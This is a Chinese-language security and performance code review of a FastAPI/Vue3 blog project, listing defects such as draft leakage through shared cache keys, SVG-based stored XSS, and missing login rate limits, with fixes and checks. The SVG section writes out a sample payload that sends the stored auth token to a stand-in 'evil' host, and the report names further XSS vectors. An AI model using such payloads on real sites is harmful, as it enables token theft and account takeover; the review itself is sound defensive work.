# Bluemoon 代码审查报告（性能 + 安全）

审查范围：`blog-api/`（FastAPI，全部 51 个 py），`blog-web/src/`（Vue3，全部组件/视图/composable），配置文件（`.env`、`vite.config.js`、`run-*.bat` 未在本次范围）。
审查时间：2026-09-13。基线 commit：`d64431e`（工作区有未提交改动）。

结论：**架构分层清晰、缓存与图片生命周期设计成熟**，但存在 1 个功能性缺陷（前端必崩）、3 个高危安全项、5 个中高优先级性能/安全问题。

---

## 一、问题总览

| # | 级别 | 类型 | 位置 | 问题 |
|---|------|------|------|------|
| F1 | 🔴 高 | 功能缺陷 | `PostCard.vue:43` | 使用未导入的 `resolveImageUrl` → `/categories` 带封面卡片渲染报错 |
| S1 | 🔴 高 | 信息泄漏 | `post_service.py:275` | 草稿详情写入公共缓存 key，匿名访客可读到未发布草稿 |
| S2/P1 | 🔴 高 | 性能 + DoS | `upload.py:85` / `image_service.py:297` | 公开接口全量扫盘 + 每图一次 `LIKE '%…%'` 全表扫描 |
| S3 | 🔴 高 | 存储型 XSS | `config.py:90` | 上传白名单含 `svg`，同源托管 → 任意 JS 执行并可窃取 token |
| S4 | 🟠 中高 | 认证 | `auth.py:59` / `deps.py:20` | 登录无限重试；`X-Forwarded-For` 无条件信任 → 阅读量可无限刷 |
| S5 | 🟠 中 | 会话 | `request.js:11` / `auth_service.py:62` | 24h token 存 localStorage；改密不吊销旧 token |
| S6 | 🟠 中 | 信息泄漏 | `Login.vue:38` | 登录页硬编码展示 `admin / admin123` |
| P2 | 🟠 中 | 性能 | `post_service.py:116,404` | 列表/归档把 `content` TEXT 全量拉回；归档无分页全量载入 |
| P3 | 🟠 中 | 性能 | `Home.vue:180` | 首页每次加载触发全量图库扫描（放大 S2） |
| P4 | 🟠 中 | 性能 | `cache.py:230` | 文章一改就 SCAN 清空全部列表缓存 + 站点/统计缓存 |
| P5 | 🟠 中 | 性能 | `post_service.py:159` | 阅读数逐个 `GET` Redis（列表 10 项 = 10 次往返） |
| P6 | 🟠 中 | 性能 | `upload.py:50` / `auth.py:105` | `async def` 里做同步 Pillow 编解码 + 磁盘写入，阻塞事件循环 |
| S7 | 🟡 中低 | 信息泄漏 | `health.py:14,33` | 公开暴露 MySQL 错误详情 / 缓存键数量；生产未关 docs |
| S8 | 🟡 中低 | 越权 | `posts.py:30` | 任何带合法 token 的账号列表接口不限 status → 可见草稿 |
| S9 | 🟡 中低 | 越权删除 | `upload.py:155` | 图库删除接口可删 `static/avatar/` 等长期资产，留下悬空记录 |
| S10 | 🟡 中低 | DoS / 逻辑 | `auth.py:27,119` | 图片解压炸弹无像素上限；处理失败回退**未压缩原图**绕过限制 |
| F2 | 🟡 中低 | XSS 面 | `MarkdownView.vue:17` | `html: true` + `v-html`，正文内原始 HTML 原样渲染 |
| P7 | 🟢 低 | 性能 | `main.py:134` / `deps.py:56` | 每次 SPA 回退读盘 + 直连 Session；`get_optional_user` 每请求多一次查询 |
| P8 | 🟢 低 | 缓存 | `main.py:64` | `/static` 一刀切 `immutable`，将来放可变更文件名会永久缓存 |
| S11 | 🟢 低 | 校验 | `schemas/user.py:55,43` | `email` 无格式校验；新密码仅 `min_length=6` |
| F3 | 🟢 低 | 前端性能 | `Home.vue:153` / `PostCard.vue:22` | 首页 `page_size:50` 无分页；`hl()` 在模板内每次重算 |
| F4 | 🟢 低 | 健壮性 | `stores/user.js:10` | 模块初始化 `JSON.parse` 无 try/catch → 存储损坏即白屏 |
| F5 | 🟢 低 | 暴露面 | `vite.config.js:25` | dev server `host: '0.0.0.0'` 暴露到局域网 |

---

## 二、高危项详情

### F1. `PostCard.vue` 使用了未导入的 `resolveImageUrl`（功能崩溃）

`blog-web/src/components/PostCard.vue`

```js
import { formatDate } from '@/utils/format'          // ← 少了 resolveImageUrl
const coverUrl = computed(() => resolveImageUrl(props.post.cover))   // :43
```

`vite.config.js` 的 `AutoImport` 只注册了 `ElementPlusResolver`，不覆盖项目内 `@/utils/format`，所以这里是真正的 `ReferenceError`。
触发路径：`Categories.vue:31` 渲染 `<PostCard :post="p" />` → 模板 `:src="coverUrl"` → computed 求值即抛错 → 该页所有**带封面**的文章卡片渲染失败（无封面文章走 `v-if` 分支不触发）。
`git log` 仅一次提交，说明该缺陷自初始提交起就存在。

修复：

```js
import { formatDate, resolveImageUrl } from '@/utils/format'
```

验证：访问 `/categories` 并选择一个有封面的分类，Console 应无报错、封面正常显示；或在 `vite build` 后用 Playwright 断言 `.post-card img` 存在且 `naturalWidth > 0`。

---

### S1. 草稿被写入公共缓存 key，匿名可读未发布内容

`blog-api/app/services/post_service.py:273-288`

```python
def get_post_detail_cached(db, slug, allow_draft=False):
    cache_key = make_key(K_POST_DETAIL, slug=slug)   # ← key 不含权限维度
    def _producer():
        post = get_post_by_slug(db, slug, allow_draft=allow_draft)
        ...
        return serialize_post(post, with_content=True)
```

`posts.py:130`：`allow_draft = current_user is not None and current_user.is_superuser`，管理员/带 token 访问 `/api/v1/posts/detail/{草稿slug}` 时，`_producer` 返回草稿全文并写入 `bm:post:detail:{slug}`（TTL 600s）。此后**匿名访客**请求同一 slug 直接命中缓存 → 草稿完整内容泄漏。

修复：key 携带权限维度（最小改动）：

```python
# cache.py
K_POST_DETAIL = "post:detail:{scope}:{slug}"     # scope: pub | draft
# post_service.py
scope = "draft" if allow_draft else "pub"
cache_key = make_key(K_POST_DETAIL, scope=scope, slug=slug)
```

注意 `invalidate_post` 与 `cache.py` 中所有使用 `K_POST_DETAIL` 的地方要同步（含 `flush_view_deltas` 之外仅此一处）。更简单的替代方案：`allow_draft=True` 时直接绕过缓存查库。

验证：`curl` 带 admin token 请求草稿 slug → 再不带 token 请求同一 slug → 必须 404（当前会返回草稿 JSON）。

---

### S2/P1. 公开图库接口 = 全量扫盘 + N 次全表扫描

`blog-api/app/api/v1/upload.py:85-137`（无鉴权、无缓存）+ `app/services/image_service.py:295-300`

```python
q = db.query(Post).filter(or_(Post.cover == url, Post.content.like(f"%{url}%")))
```

`list_images` 对 `static/` 做 `rglob("*")` 遍历，**每张图**执行一次 `content LIKE '%url%'`。前导通配符使索引失效 → 对 `posts.content`（TEXT）全表扫描。200 张图 = 200 次全表扫描，单请求可吃掉秒级 CPU/IO，且接口公开、无缓存、无分页 → 极易被当作放大攻击入口。

同一函数还驱动：
- `_check_image_references`（`upload.py:140`）：后台"检查引用"按钮点一次 = O(选中数 × 全表扫描)；
- `sync_post_images` / `remove_post_images`：每个被移除 URL 各一次。

修复方向（任选，建议 1+2）：

1. 一次性取回所有文章的引用集合，在 Python 侧比对：

```python
def _referenced_map(db) -> dict[str, list[Post]]:
    rows = db.query(Post.id, Post.title, Post.cover, Post.content).all()
    m: dict[str, list[Post]] = {}
    for r in rows: ...
    return m
```

2. `/upload/images` 加 60s 缓存 + 分页；首页不再请求全量（见 P3）。
3. 长期方案：`post_images(post_id, url)` 关联表，删除/引用检查走索引。

验证：造 100+ 张图后 `curl --noproxy '*' -w '%{time_total}' .../api/v1/upload/images`，修复前后对比耗时；MySQL `SHOW GLOBAL STATUS LIKE 'Handler_read_rnd_next'` 前后差值可量化扫描行数。

---

### S3. 上传白名单含 SVG → 同源存储型 XSS

`blog-api/app/core/config.py:90`：`ALLOWED_IMAGE_EXT = "jpg,jpeg,png,gif,webp,bmp,svg"`，`.env` 同值。
`main.py:113` 用 `CachedStaticFiles` 直接托管 `/static`，SVG 以 `image/svg+xml` 返回，**由浏览器在同源下作为文档执行**。构造 `<svg xmlns=... onload="fetch('//evil/'+localStorage.bm_token)">` 上传后访问 `/static/<path>.svg` 即执行任意 JS，可直接读走 `bm_token`（配合 S5）。
另外 `upload_image` 只校验**扩展名**，不校验真实内容类型（未做魔数/解码校验）。

修复：

- 从 `ALLOWED_IMAGE_EXT` 与 `.env` 中移除 `svg`（最直接，博客场景不需要）；
- 若必须支持 SVG：静态响应加 `Content-Disposition: attachment` 或 `Content-Security-Policy: sandbox`，并做 SVGO/Sanitizer 白名单清洗；
- 用 `PIL.Image.open().verify()` 或 `python-magic` 校验真实格式，与扩展名不符则拒绝。

验证：上传 `payload.svg` → 访问其 URL，脚本不应执行（移除 svg 后应返回 400 "不支持的图片格式"）。

---

## 三、中高优先级详情

### S4. 无速率限制；`X-Forwarded-For` 无条件信任

- `auth_service.authenticate` + `/auth/login`（`auth.py:59`）无失败计数、无锁定、无验证码 → 可离线式暴力破解 `admin`。项目已定义 `TooManyRequestsException`（`exceptions.py:44`）但**全项目零使用**。
- `deps.py:20-25`：

```python
forwarded = request.headers.get("x-forwarded-for")
if forwarded: return forwarded.split(",")[0].strip()
```

本机/无反向代理部署下该头完全由客户端控制 → `bm:post:view:lock:{post}:{ip}` 永远不命中 → `/posts/{id}/view` 可无限刷阅读量，并会经 `flush_view_deltas` 写入真实库；`record_view` 也未校验文章是否为已发布。

修复：

- 登录：Redis `INCR login:fail:{username}:{ip}` + `EXPIRE 300`，超 5 次返回 429；或加 `slowapi`。
- XFF：仅当 `request.client.host` 属于 `TRUSTED_PROXIES` 白名单时才采信 XFF，否则忽略（新增配置项）。
- `record_view` 增加 `Post.status == PUBLISHED` 校验。

### S5. 会话策略

`ACCESS_TOKEN_EXPIRE_MINUTES=1440`（24h，`.env:26`）；token 存 `localStorage`（`request.js:11`，XSS 可直接读取 → 与 S3/F2 组合放大）；`change_password`（`auth_service.py:62`）只改哈希，**不吊销已有 token**，接口却返回"请重新登录"。

修复：有效期降至 2h + refresh token；改密时写 `password_changed_at` 并在 `_load_user` 校验 `iat`，或把当前用户全部活跃 jti 加黑名单。

### S6. 登录页硬编码默认口令

`Login.vue:38-40`

```html
默认账号 <code>admin</code> / 密码 <code>admin123</code>
```

生产构建会带上这段文案，等于公开赠送账号；对应的默认密码很可能从未修改。

修复：删除该提示；确需保留开发提示，用 `v-if="import.meta.env.DEV"`（注意 string 插值不会被 tree-shaking 除去，必须走条件渲染）+ 强制首次登录改密。

### P2. 列表 / 归档把 `content` TEXT 全量拉回

`post_service.py:116` 与 `:404` 都用 `_base_query(db)` 全列 `select(Post)`。`serialize_post(..., with_content=False)` 只是**不输出**，DB 仍然传输正文。`list_archive` 更是 `.all()` 一次性载入**全部已发布文章 + 正文**，无 limit，文章多了会内存尖峰。

修复：`stmt.options(load_only(Post.id, Post.title, Post.slug, Post.summary, Post.cover, Post.status, Post.views, Post.published_at, Post.created_at, Post.category_id, Post.is_top, Post.word_count))`；或把模型上 `content: Mapped[str] = mapped_column(Text, deferred=True)`，详情接口再显式 `undefer`。归档建议加分页或只取列的 `select(Post.id, Post.title, Post.slug, Post.published_at)`。

### P3. 首页触发全量图库扫描

`Home.vue:174-187`：`onMounted` 里无条件 `getImages()`，只为"无封面文章"兜底取图。首屏 banner 已有 `site.banner`（后端 `latest_gallery_image()` 只扫 `static/gallery/` 且不查库）。叠加 S2 → 每次首页访问都触发一次全量扫盘 + N 次全表扫描，直接拖慢 LCP。

修复：首页不再全量请求；改为后端提供轻量接口（只返回 `url` 列表、带缓存），或前端延迟到 `requestIdleCallback`/进入首屏后加载。

### P4. 站点级缓存失效粒度过粗

`cache.py:219-239`：`invalidate_post()` → `_invalidate_site_level()` → `delete_prefix('post:list:')`（SCAN 全量）+ 删 `site:info` / `stats:*` / `tax:categories`。
保存**草稿**也会走到这里 → 一次草稿保存清空所有列表缓存与统计缓存。写多读少时缓存命中率会崩。

修复：
- 草稿保存（且原本就是草稿）不触发站点级失效；
- 列表缓存加版本号 `post:list:{ver}:{hash}`，`ver` 用 `INCR post:list:ver` 代替 SCAN 批量删除（`delete_prefix` 在百万 key 下也危险）。

### P5. 阅读数逐个 `GET` Redis

`post_service.py:159-167` `current_views()` 每次调用一次 `cache.get`：`list_posts` 每页 10 项 = 10 次往返；`list_archive` 为 N 项。`stats_service._total_views` 先 `SCAN` 再逐 key `GET`。

修复：新增 `cache.mget(keys)`（client 已支持 `mget`），列表/归档构造完 items 后一次性 `mget bm:post:views:{id}` 批量叠加。

### P6. `async def` 里做同步 CPU/IO

`upload.py:50 upload_image`、`auth.py:105 upload_avatar` 都是 `async def`，`await file.read()` 之后紧接着**同步**执行 Pillow 缩放 + 2 次 WebP 编码（`image_service._write_derivatives`）与 `write_bytes`。单次上传可达数百 ms 且全程阻塞事件循环，并发上传时整个 API 卡住。

修复：把这两个端点改成普通 `def`（FastAPI 自动放线程池），或把 `store_image` 包进 `run_in_threadpool`。

### S7/S8/S9. 越权与信息暴露

- `health.py:14` `/health` 公开返回 `db_detail`（异常串可能含主机/账号）与 `env`；`health.py:33` `/cache/info` **未加 `get_current_admin`**，公开返回缓存键数量。生产 `APP_ENV=production` 时也未关闭 `/docs`、`/redoc`、`/openapi.json`（`main.py:83-85`）。
  修复：health 只回 up/down 布尔；cache/info 加管理员依赖；`docs_url=None if settings.APP_ENV == "production" else "/docs"`（三者同理）。
- `posts.py:30`：`status = PostStatus.PUBLISHED if current_user is None else None` → 任何持合法 token 的账号都能看到草稿；而详情接口要求 `is_superuser`（`posts.py:130`）。当前只有 admin 账号，风险有限，但语义不一致。
  修复：改为 `status = None if (current_user and current_user.is_superuser) else PostStatus.PUBLISHED`。
- `upload.py:155 delete_image`：`_guard_not_post_image` 只挡 post 作用域，`url=/static/avatar/xxx.jpg` 可被删除接口直接 `unlink`，绕过 `user_avatars` 归档（`avatar_service.delete_avatar` 才负责记录清理）→ 悬空历史记录 + 前台头像 404。`image_service.is_long_term_asset()` 已经写好，只是没用于删除守卫。
  修复：在 `delete_image` / `batch_delete_images` 入口加 `if is_long_term_asset(url): raise BizException("长期资产请在对应管理页操作")`。

### S10. 图片处理的内存与逻辑缺陷

- `auth.py:119`：`content = await file.read()` 先把整个文件读进内存再判 5MB 上限；`await file.read(MAX+1)` 更稳妥。
- `auth.py:27-56 _process_avatar_image`：`except Exception: return content` → 图片处理失败时**落盘未压缩原图**，等于绕过 512px 限制（上传一张 8000×8000 的畸形图即可）。
- Pillow 的 `MAX_IMAGE_PIXELS` 默认只发 `DecompressionBombWarning`（超 2 倍才报错），高压缩比 PNG 可在缩放阶段吃满内存。

修复：`Image.MAX_IMAGE_PIXELS = 50_000_000` 并在两处入口捕获 `Image.DecompressionBombError`；处理失败时返回明确错误（"图片解析失败"）而非回退原图。

### F2. Markdown `html: true` + `v-html`

`MarkdownView.vue:17` 开启原始 HTML，`:2` 直接 `v-html` 注入。`<script>` 不执行（innerHTML 语义），但 `<img src=x onerror=…>` / `<svg onload=…>` / `<iframe srcdoc=…>` 均执行。当前内容只由管理员撰写，风险中等；一旦引入导入、协作或评论即升级为高危（可窃取 `bm_token`）。

修复：`html: false`（markdown-it 默认会拦截 `javascript:` 协议，正文仍可写 Markdown）；若必须支持内嵌 HTML，接 DOMPurify 白名单清洗，并在后端下发 CSP `script-src 'self'`。另 `MarkdownView.vue:54-65` 把 JS 字符串拼进 `onerror` 属性，建议统一改用项目已有的 `onImageError` + `data-original` 方案。

---

## 四、低优先级与建议项

| 项 | 位置 | 建议 |
|----|------|------|
| P7 | `main.py:134-158` | index.html 每次 `read_text`（可加 mtime 缓存）；`SessionLocal()` 直连可接受，但 `get_optional_user` 让每个带 token 的请求多一次用户查询，列表接口可延后加载用户 |
| P8 | `main.py:64-75` | `/static` 无条件 `immutable`：改为只对匹配 `YYYYMMDDHHMMSS_` 命名或日期目录的文件加 immutable |
| S11 | `schemas/user.py:55,43` | `email` 用 `EmailStr`；`new_password` 至少要求长度 8 + 字母数字混合 |
| F3 | `Home.vue:153`、`PostCard.vue:22` | 首页固定 `page_size:50` 无分页（建议首屏 10 + 分页/虚拟滚动）；`hl()` 在模板中直接调用，建议改 `computed` |
| F4 | `stores/user.js:10` | `JSON.parse` 包 try/catch，解析失败时 `clear()` |
| F5 | `vite.config.js:25` | dev `host` 改 `127.0.0.1`，需要局域网调试时再临时开 |
| — | `_tools/redis/redis.windows.conf` | 已 `bind 127.0.0.1` + `protected-mode yes`（安全），但**未设 requirepass**；若将来改 bind 到 0.0.0.0 必须同时设密码 |
| — | 仓库卫生 | `.env` 未被 git 跟踪、`.env.example` 的 `SECRET_KEY` 为空 —— ✅ 正确；`_tools/redis/`、`blog-api/static/`、`logs/` 均已忽略 ✅ |

---

## 五、修复优先级建议

**P0（今天就修，改动小、收益大）**
1. F1 补 `resolveImageUrl` 导入（1 行）。
2. S1 缓存 key 加 `scope` 维度（3 行 + 失效同步）。
3. S3 从白名单去掉 `svg`（1 行 + `.env`）。
4. S6 删除登录页默认口令提示。

**P1（本周）**
5. S4 登录失败限流 + XFF 白名单校验。
6. S2/P1/P2/P3 图片引用检查批量化 + 列表/归档 `load_only` + 首页不再全量拉图库。
7. S7/S8/S9 越权与信息暴露三处收口。

**P2（有空再做）**
P4 缓存失效粒度、P5 Redis 批量读、P6 线程池、S5 会话策略、F2 关闭 `html: true`、S10 图片处理加固。

---

## 六、验证方式汇总

| 项 | 验证命令 / 操作 | 期望 |
|----|----|----|
| F1 | 打开 `/categories` 选带封面分类，看 Console | 无 `ReferenceError`，封面正常 |
| S1 | admin token 请求草稿 slug，再匿名请求同一 slug | 匿名必须 404 |
| S2 | 100+ 图后 `curl --noproxy '*' -w '%{time_total}' .../upload/images` | 修复后耗时显著下降（目标 < 200ms） |
| S3 | 上传含 `onload` 的 `.svg` 并访问 | 返回 400；URL 不存在 |
| S4 | 连续 10 次错误密码登录 | 第 6 次起 429 |
| S4 | 同一 IP 对同一文章伪造不同 XFF 连刷 `/view` | 阅读数只 +1 |
| S9 | 带 admin token `DELETE /upload/image?url=/static/avatar/<x>.jpg` | 400 拒绝，文件仍在 |
| S7 | 匿名 `GET /api/v1/cache/info` | 401 |
| P2 | 列表接口响应体 + MySQL `Handler_read_rnd_next` 差值 | 不再传输 content，扫描行数下降 |
